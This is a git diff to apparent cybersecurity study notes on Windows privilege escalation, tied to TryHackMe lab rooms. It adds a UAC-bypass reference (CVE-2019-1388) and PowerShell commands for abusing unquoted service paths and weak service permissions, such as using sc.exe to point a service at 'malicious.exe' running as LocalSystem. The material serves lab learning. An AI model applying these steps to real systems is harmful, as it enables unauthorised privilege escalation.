@@ -57,9 +57,11 @@ Aside from commands that are in the Windows notes, here are a few used in cybers
 
 <div class="row row-cols-md-2 mt-4"><div>
 
-* ➡️ Exploit User Account Control (UAC) which is the popup prompted when trying to run a program as administrator. 
+* ➡️ [CVE-2019-1388](https://github.com/nobodyatall648/CVE-2019-1388)
 
-> See [CVE-2019-1388](https://github.com/nobodyatall648/CVE-2019-1388).
+[![blaster](../../_badges/thm-p/blaster.svg)](https://tryhackme.com/room/blaster)
+
+Exploit User Account Control (UAC) which is the popup prompted when trying to run a program as administrator.
 </div><div>
 </div></div>
 
@@ -200,6 +202,22 @@ PS> sc.exe start xxx
 PS> icacls C:\[...]\service.exe
 PS> move C:\[...]\service.exe C:\[...]\service.exe.old
 PS> icacls C:\[...]\malicious.exe /grant Everyone:F
+```
+
+* ➡️ Unquoted Service Paths: if the service is using a PATH in which there is spaces, the service isn't quoted, and the hacker can create files, then the hacker may create an executable that is executed with the rest of the path in argument.
+
+```bash
+PS> icacls $Env:appdata\Vulnerable Program\service.exe
+PS> move C:\[...]\malicious.exe $Env:appdata\Vulnerable.exe
+# the service will execute
+# $Env:appdata\Vulnerable.exe Program\service.exe
+```
+
+* ➡️ Insecure Service Permissions: if we can edit the permissions of a service, for instance, to change the location of the binary. See [accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk). If the user is granted `SERVICE_ALL_ACCESS` on the service, then have fun. 
+
+```bash
+# LocalSystem is the highest privileged account available
+PS> sc.exe config xxx binPath=C:\[...]\malicious.exe  obj= LocalSystem
 ```
 </div></div>
 
